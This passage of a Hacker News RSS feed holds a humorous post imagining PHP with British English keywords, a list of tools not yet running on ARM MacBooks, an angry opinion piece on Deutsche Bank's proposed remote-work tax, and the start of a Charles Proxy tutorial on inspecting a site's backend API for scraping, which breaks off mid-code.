<p><em>Edit: I have corrected the expansion of "preg_match" - thanks to those who pointed it out.</em></p>
<h3>Eloquence</h3>
<pre>if ($condition) {
    // Code here
} else {
    // Code here
}</pre>
<p>Shakespeare would be ashamed to see his native tongue twisted into this monstrosity. Brevity is to be applauded in the right context - in some dark corner, where it shall be seldom seen - but not here. The if ... else block is the most used conditional code in all of PHP, so it must be made as inoffensive as possible. There are many options for its replacement, but this may be the strongest:</p>
<pre>perchance (£condition) {
    // Code here
} otherwise {
    // Code here
}</pre>
<p>The same naturally applies to the Americanised switch ... case construct, which one can only describe as clunky and unpleasant:</p>
<pre>switch ($variable) {
    case $option1:
        //Code here
        break;
    case $option2:
        //Code here
        break;
    default:
        //Code here
        break;
}</pre>
<p>Words such as "switch", "break" and "default" are hard on the reader and lack context. The Right Honourable <a href="https://www.reddit.com/r/proper/comments/jp1yf/for_the_consideration_of_my_most_respectable/c2dz9zc">biggerthancheeses</a> was kind enough to contribute a more gentrified suggestion (and has some interesting ideas, particularly around replacement of "include()" with something like "i_might_be_partial_to()", demonstrating a natural talent for the Imperialisation of programming languages):</p>
<pre>what_about (£variable) {
    perhaps £possibility:
        //Code here
        splendid;
    perhaps £other_possibility:
        //Code here
        splendid;
    on_the_off_chance:
        //Code here
        splendid;
}</pre>
<h3>Spelling</h3>
<pre>imagecolorallocate()
serialize()
newt_centered_window()
connection_status()</pre>
<p>Words fail me at this point. How is any self-respecting gentleman expected to make head or tail of these "words". It beggars belief that anyone could allow such distortions of words to be entered into a programming language. They, along with the cornucopia of similar errors, should be reverted to their proper forms immediately:</p>
<pre>imagecolourallocate()
serialise()
newt_centred_window()
connexion_status()<sup><a href="https://aloneonahill.com/%5B~%5B*id*%5D~%5D#note1" id="notelink1">1</a></sup></pre>
<h3>Manners</h3>
<pre>try {
    // Code here
} catch (Exception $e) {
    // Handle exception
    die('Message');
}</pre>
<p>The try ... catch block is an excellent example of PHP's lack of manners. Far too direct to be allowed in the new PHP. Additionally, the word "die" is so very depressing. This new block, although more verbose, is vastly more polite and upbeat:</p>
<pre>would_you_mind {
    // Code here
} actually_i_do_mind (Exception £e) {
    // Politely move on
    cheerio('Message');
}</pre>
<h3>Class</h3>
<p>Perhaps nothing is as important and ingrained in the British psyche as the notion of class and, while there are few opportunities for change within this part of PHP, the changes that there are to be made here are important.</p>
<pre>class Republic {
    public $a;
    private $b;
    protected $c;
}
$example = new Republic();</pre>
<p>To begin with, the current system has no place for class hierarchy and this is unacceptable. So we shall begin by giving classes specific levels - upper, middle, working - and no class can access the methods of one of a higher level without the explicit permission of the higher order class (of course, though it might then have access, it would not be a true member of the higher order and could not itself grant higher order access to other lower order classes). "Public" and "Private", in the British class system, are often synonymous (see, for example, school system nomenclature), so these must be adjusted, as should the "Protected" property visibility. The word "new", while passable, has a much more appropriate replacement in matters of class.</p>
<pre>upper_class Empire {
    state £a;
    private £b;
    hereditary £c;
}
£example = nouveau Empire();</pre>
<h3>The Sun Never Sets ...</h3>
<p>It is hoped that these few simple changes will improve the reputation and status of PHP among other languages. No longer will it be the poor American cousin - instead it can take its rightful place as the - British - King of the scripting languages.</p>
<h3>Thanks</h3>
<p>Many thanks to <a href="https://twitter.com/#!/markwallman">Mark</a> and <a href="https://twitter.com/#!/bluevurt">Pat</a>, former colleagues, who helped start this resurrection of the British Empire in the pub on Friday.</p>
<p><a href="https://aloneonahill.com/%5B~%5B*id*%5D~%5D#notelink1" id="note1">1</a>. Yes, <a href="https://en.wikipedia.org/wiki/American_and_British_English_spelling_differences#-xion.2C_-ction">connexion</a>.</p>

    <p>
      <i></i> <span>20 August 2011</span> &nbsp; | &nbsp; <i></i>          <a href="https://aloneonahill.com/blog/?tag=php">php</a>,          <a href="https://aloneonahill.com/blog/?tag=development">development</a>,          <a href="https://aloneonahill.com/blog/?tag=humour">humour</a>,          <a href="https://aloneonahill.com/blog/?tag=empire">empire</a>    </p>

    
    
    



















    </div>

        <!-- /sidebar -->

        <!-- google_ad_section_end -->
              </div>

    </div></div></div>]]>
            </description>
            <link>https://aloneonahill.com/blog/if-php-were-british/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071058</guid>
            <pubDate>Thu, 12 Nov 2020 15:47:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Libraries that don't run on the new MBPs yet]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071022">thread link</a>) | @RikNieu
<br/>
November 12, 2020 | https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/ | <a href="https://web.archive.org/web/*/https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>(Photo by <a href="https://unsplash.com/@tma?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Tianyi Ma</a> on <a href="https://unsplash.com/s/photos/macbook?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a>)</p><p>Even though I have my issues with Apple's MacBooks(DONGLES!), I'm still pretty excited for the new ARM-based MacBook Pro. My current machine is nearing the end of its life, and I am on the prowl for an updated one.</p><p>And with <a href="https://www.macrumors.com/2020/11/11/m1-macbook-air-first-benchmark/">posts like this one by MacRumors</a>, indicating that the freaking ARM MacBook Air will outperform any existing Mac on a single-core, and on multi-core it wipes the floor with all of the 2019 16-inch MacBook Pros, I'm really blown away by the possible performance increases the new MacBook Pro would offer!</p><p>But beneath my excitement for the much-touted performance and battery-life improvements lurks the potential compatibility issues that switching to new silicon could bring. </p><p>Will I spend the money equivalent to a small countries GDP, and then sit with a spoiled-brat machine refusing to work with the icky libraries and tools I use on a daily basis? Also, would stuff I code on an ARM MBP work on my Intel &amp; Linux servers?</p><p>Well, other developers have been wondering the same, and someone started a helpful <a href="https://github.com/Homebrew/brew/issues/7857">issues thread on the Homebrew Github</a>, with a list of popular libraries and tools, and if they work on the new Macs.</p><p>Here's 10 tools and libraries that, as-of 12 Nov 2020, are still not fully supported yet.</p><ul><li><strong>Bash</strong></li><li><strong>Cask</strong></li><li><strong>Cocoapods</strong></li><li><strong>Numpy</strong></li><li><strong>Docker</strong></li><li><strong>Openjdk (Gradle, Elasticsearch, React-Native, Android, Jenkins, Maven)</strong></li><li><strong>Go (Kubernetes)</strong></li><li><strong>MySQL</strong></li><li><strong>Postgress</strong></li><li><strong> Zsh</strong></li></ul><p>Those would be crucial to get working before I'd seriously consider forking out the cash for a new Mac. Let's watch this space.</p><p>Thanks for reading. If you have any comments or suggestions, follow and contact me on Twitter <a href="https://twitter.com/riknieu">@RikNieu</a>.</p><p>If you want to read more of my rants, sign up below and I'll mail you when I post new stuff. 👇</p>
			</section></div>]]>
            </description>
            <link>https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071022</guid>
            <pubDate>Thu, 12 Nov 2020 15:43:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote Staff ‘should pay more tax’ says Deutsche Bank]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071015">thread link</a>) | @kiraleighleigh
<br/>
November 12, 2020 | https://weebtrash.ga/2020/11/12/remote-staff-should-pay-more-tax-says-douche-bank/ | <a href="https://web.archive.org/web/*/https://weebtrash.ga/2020/11/12/remote-staff-should-pay-more-tax-says-douche-bank/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<div>
		<!-- Start Article -->
				<article>		
						<div id="post-1366">
				<div>
					<!-- Start Content -->
					<div id="content">
					<header>
						<!-- Start Title -->
						
						<!-- End Title -->
						<p>Posted On November 12, 2020</p>

					</header>

						
<p>Actual muppets <a href="https://www.theguardian.com/business/deutschebank">Deutsche Bank</a> propose charging staff who work from home after the pandemic <strong>5% for each day</strong> they work remotely, states <a rel="noreferrer noopener" href="https://www.theguardian.com/business/2020/nov/11/staff-who-work-from-home-after-pandemic-should-pay-more-tax" target="_blank">recent bonkersville article</a> by Joanna Partridge. </p>



<p>Douche Bank posits that the average WFH employee won’t be negatively impacted, because what they save by not commuting or buying overpriced Starbucks sandwiches will even out, somehow.</p>



<blockquote><p>The report from the German lender’s economic research unit has calculated that such a tax could raise $49bn (£37bn) a year in the United States, €20bn (£17.8bn) in Germany and £7bn in the UK.&nbsp;</p></blockquote>



<p>They suggest this could go to help lower income workers by giving them a leg up. Stunningly, their suggestion to push this tax onto employers comes as an afterthought, and there’s no mention of <a rel="noreferrer noopener" href="https://uspirg.org/sites/pirg/files/cpn/USN-011218-B2-REPORT/Offshore-Shell-Games_3.html" target="_blank">offshore shell games</a>, tax loopholes, or <a href="https://www.cnbc.com/2020/02/04/amazon-had-to-pay-federal-income-taxes-for-the-first-time-since-2016.html#:~:text=After%20two%20straight%20years%20of,an%20SEC%20filing%20on%20Thursday.&amp;text=In%202018%2C%20Amazon%20posted%20income,paid%20%240%20in%20federal%20taxes." data-type="URL" data-id="https://www.cnbc.com/2020/02/04/amazon-had-to-pay-federal-income-taxes-for-the-first-time-since-2016.html#:~:text=After%20two%20straight%20years%20of,an%20SEC%20filing%20on%20Thursday.&amp;text=In%202018%2C%20Amazon%20posted%20income,paid%20%240%20in%20federal%20taxes.">forcing big companies to pay their fair share</a> in taxes.</p>



<p>Never you mind that, specifically Americans, <a rel="noreferrer noopener" href="https://www.cnbc.com/2019/03/14/heres-how-many-americans-are-not-saving-any-money-for-emergencies-or-retirement-at-all.html#:~:text=After%20all%2C%2069%20percent%20of,annual%20income%2C%E2%80%9D%20Bankrate%20reports." target="_blank">save less than 10% of their income</a>, and <a rel="noreferrer noopener" href="https://finance.yahoo.com/news/58-americans-less-1-000-090000503.html" target="_blank">58% of Americans have less than $1k saved in the bank</a>. </p>



<p>Let’s force the people, yet again, to step in for what businesses should already be doing (paying people for the work-risk and their commutes and committing to pay people more), and what governments should already be doing (stimulus stimulus STIMULUS), because heaven forbid anybody saves any money at all, ever.</p>



<p>Amidst a pandemic, that is crushing so many actual people, and helping literal dragons, this not only sounds absolutely bonkers, but tone-deaf as all fuck. </p>



<blockquote><p>“A big chunk of people have disconnected themselves from the face-to-face world yet are still leading a full economic life. That means remote workers are contributing less to the infrastructure of the economy whilst still receiving its benefits. That is a big problem for the economy.”</p></blockquote>



<p>The ridiculousness of saying remote workers are “contributing less to the infrastructure of the economy” is absolutely stunning when you consider that actual dragons have managed to grow <a rel="noreferrer noopener" href="https://www.businessinsider.com/billionaires-net-worth-increases-coronavirus-pandemic-2020-7" target="_blank">$637 billion dollars richer during COVID-19</a> so far.</p>



<blockquote><p>A daily 5% working from home tax would cost an employee earning £35,000 just under £7 a day, according to Templeman’s calculations. He suggests the £6.9bn raised in the UK by taxing remote workers could provide a grant of £2,000 to the 12% of people aged over 25 who earn the minimum wage.</p></blockquote>



<p>The absolute audacity to suggest remote workers take on this burden, versus suggesting minimum wage itself be raised, is actually giving me emotional hemorrhoids. </p>



<p>The powerful will look for any goddamn way possible to get out of raising the minimum wage, giving more cash to people who have to potentially expose themselves to COVID-19 in their workplace, or helping those with lower income from their own goddamn pockets.</p>



<p>They will do absolutely anything for this purpose. They will displace the responsibility, and place blame on the shoulders of people who, yes, are also trying to survive. </p>



<p>They will get actual Douche Banks to speak for them. They will completely ignore the <a rel="noreferrer noopener" href="https://www.scientificamerican.com/article/commuting-takes-its-toll/#:~:text=Several%20studies%20have%20shown%20that,problems%20and%20high%20blood%20pressure." target="_blank">mental health strain of long commutes</a>. </p>



<p>They will do anything in their power to not actually put in real effort, such as whole-ass slapping employers until they do the right thing.</p>



<p>As late stage capitalism strikes yet again, where human beings are only important insofar as they consume consume, consume, I cannot help but feel like someone with a grasp on our dire circumstances, a smidgen of empathy, and an understanding of what capitalism is actually about, should have warned Douchecanoe McBank that this was Not The Way.</p>



<p>Silly me, thinking that a Bank’s financial study would do anything more than lovingly shine a boot, to therein lodge it so firmly down its own esophagus, as to crap it out the other side.</p>



<p>Silly me, thinking that the responsibility to provide for those who are placed in harm’s way should be footed by the people who place them in harm’s way for profits.</p>



<p>Silly. Fucking. Me.</p>
<p>Hits: 212</p>
																		<!-- Start Tags -->
						
						<!-- End Tags -->
											</div><!-- End Content -->
					  
								  
								
<!-- You can start editing here. -->
			
							</div>
						</div>
									</article>
				<!-- End Article -->
				<!-- Start Sidebar -->
				
				<!-- End Sidebar -->
			</div>
		</div></div>]]>
            </description>
            <link>https://weebtrash.ga/2020/11/12/remote-staff-should-pay-more-tax-says-douche-bank/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071015</guid>
            <pubDate>Thu, 12 Nov 2020 15:42:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Charles Proxy for Web Scraping]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25070934">thread link</a>) | @daolf
<br/>
November 12, 2020 | https://www.scrapingbee.com/blog/charles-proxy/ | <a href="https://web.archive.org/web/*/https://www.scrapingbee.com/blog/charles-proxy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><img src="https://d33wubrfki0l68.cloudfront.net/0c341714fac1e681a51f25db8d80853d341830a9/c3aea/images/authors/kevin.png" alt="Kevin Sahin">
            
            <span>
                
                
                
                <span>
                    <small> ● </small>
                    
                    
                    <span>12 November, 2020</span>
                    
                    <small> ● </small>
                    <span> 10 min read </span>
                </span>
                <p> Kevin has been working in the web scraping industry for 10 years before co-founding <a href="https://www.scrapingbee.com/">ScrapingBee</a>. He is also the author of the Java Web Scraping Handbook.
                        
                        <a href="https://twitter.com/SahinKevin" target="_blank">
                        <svg style="height: 14px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z" fill="currentColor"></path>
                        </svg>
                        </a>
                        
                        
                    </p>
            </span>
        </p><div property="articleBody">
          





















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
      
      " src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg" width="1200" height="628" alt="Charles proxy for web scraping" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg">
  
</p></div>




<p>Charles proxy is an HTTP debugging proxy that can inspect network calls and debug SSL traffic. With Charles, you are able to inspect requests/responses, headers and cookies. Today we will see how to set up Charles, and how we can use Charles proxy for web scraping. We will focus on extracting data from Javascript-heavy web pages and mobile applications. Charles sits between your applications and the internet:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png" width="759" height="419" alt="Charles proxy drawing" data-src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png">
  
</p></div>




<p>Charles is like the Chrome dev tools on steroids. It has many incredible features:</p>
<ul>
<li>Bandwidth throttling to emulate slow internet connection</li>
<li>Request editing (the test the behavior of a back-end API for example)</li>
<li>Repeat requests</li>
<li>Full-text search on a list of request (very interesting for web-scraping)</li>
<li>Many more</li>
</ul>
<p>Charles is a very interesting tool when debugging Single Page application or mobile applications.</p>
<h2 id="installation-and-setup">Installation and set-up</h2>
<p>We are going to see how to install and configure Charles on macOS, but there is also a Windows and Linux version.</p>
<p>First visit <a href="https://www.charlesproxy.com/download/">https://www.charlesproxy.com/download/</a> and download Charles.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png" width="758" height="568" alt="Charles Installation Screen" data-src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png">
  
</p></div>

<figcaption>
    <small> <em> Network tab of your browser developer console </em> </small>
</figcaption>


<p>After installing Charles, you need to install its root certificate. This will allow Charles to intercept and decrypt the SSL traffic.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png" width="1907" height="989" alt="Charles Root certificate" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png">
  
</p></div>




<p>After clicking on Install Root Certificate, it will open your macOS Keychain Access, and you will have to open the Trust menu and click on “Always trust”.</p>
<p>This will ask you for your system password.</p>
<p>Now you will need to go to Proxy &gt; SSL Proxying Settings and add “*” or the domain you want to inspect SSL on.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png" width="704" height="577" alt="SSL Proxying settings" data-src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png">
  
</p></div>




<p>Charles will now capture the HTTPS traffic on the domain you've selected.</p>
<h2 id="finding-hidden-apis-on-single-page-applications">Finding hidden APIs on Single Page Applications</h2>
<p>In a traditional <em><strong>server-side</strong></em> rendered website, the HTML code is built by the backend service, and the full page is returned to the HTTP client (generally your browser).
Over the past 10 years, more and more websites are rendered <em><strong>client-side</strong></em> using a Single Page Application framework like React.js, Vue.js or Angular.</p>
<p>Those framework are sending many requests to a back-end API, and it can be a great idea to consume those APIs directly instead of scraping the site and rendering the Javascript with a headless browser to extract the data you want. It will be much faster, you don't need expensive hardware (headless browser needs a lot of RAM and powerful CPUs.).</p>
<p>We are going to look at different Single Page Application to see how Charles proxy can help you discover and extract data from back-end APIs.</p>
<p>Let's start with <a href="https://www.producthunt.com/">ProductHunt</a></p>
<p>ProductHunt is a famous website to launch products online. It's very popular in the tech ecosystem. There are dozens of projects launched every day, so the front page only loads the products of the day. There is an infinite scroll to look at previous days products.</p>
<p>We are going to use Charles proxy to analyze the backend API call and reproduce it with some Python code.</p>
<p>Now open Charles proxy and go to the Producthunt home page, scroll several times to the bottom of the page.</p>
<p>By default, Charles will capture every HTTP request made by your system, not only your browser. So you will get a lot of “pollution”. You can filter that by entering the domain you're interested in:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png" width="1905" height="460" alt="Filter by domain in Charles" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png">
  
</p></div>




<p>If you click on one of the POST requests to the <code>/frontend/graphql</code> endpoint, you can inspect both the request and the response.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png" width="1904" height="960" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png">
  
</p></div>




<p>There are many things going on with these requests, but if you compare the content being sent to the GraphQL API, it seems the only thing that changes is the <code>cursor</code> parameter.</p>
<p>It is base64 encoded, but luckily, Charles has a feature to quickly decode Base64 content. You just have to select it and right-click:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png" width="433" height="470" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png">
  
</p></div>




<p>One of the killer features Charles offers is the ability to edit any request and replay. In our case it's really great because there are many headers/cookies values inside the request, so it would be a nightmare to try to reproduce the request with an HTTP client or inside your code.</p>
<p>In order to do that, you can right-click on the request and click on Compose.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png" width="1094" height="521" alt="Compose request Charles proxy" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
    
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png">
  
</p></div>




<p>You can then play with the <code>cursor</code> value and replace it with a different page number encoded in base64. Then click on Execute.</p>
<p>You can also try deleting the different cookies (it will work). It's great news because if cookies were mandatory to use this endpoint, it would have been more complicated to reproduce the request with our Python code.</p>
<p>Now you can export the request to cURL:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png" width="665" height="496" alt="Compose request Charles proxy" data-src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png">
  
</p></div>




<p>Then you can use a tool like this one to convert the cURL command to Python code (using the wonderful Requests package): <a href="https://curl.trillworks.com/"></a><a href="https://curl.trillworks.com/">https://curl.trillworks.com/</a></p>
<p>I just added the <code>verify=False</code> parameter to avoid SSL warnings with Requests.</p>
<div><pre><code data-lang="python"><span>import</span> requests


headers <span>=</span> {
    <span></span><span>'</span><span>Host</span><span>'</span>: <span></span><span>'</span><span>www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>accept</span><span>'</span>: <span></span><span>'</span><span>*/*</span><span>'</span>,
    <span></span><span>'</span><span>x-requested-with</span><span>'</span>: <span></span><span>'</span><span>XMLHttpRequest</span><span>'</span>,
    <span></span><span>'</span><span>user-agent</span><span>'</span>: <span></span><span>'</span><span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><span>'</span>,
    <span></span><span>'</span><span>content-type</span><span>'</span>: <span></span><span>'</span><span>application/json</span><span>'</span>,
    <span></span><span>'</span><span>origin</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-site</span><span>'</span>: <span></span><span>'</span><span>same-origin</span><span>'</span>,
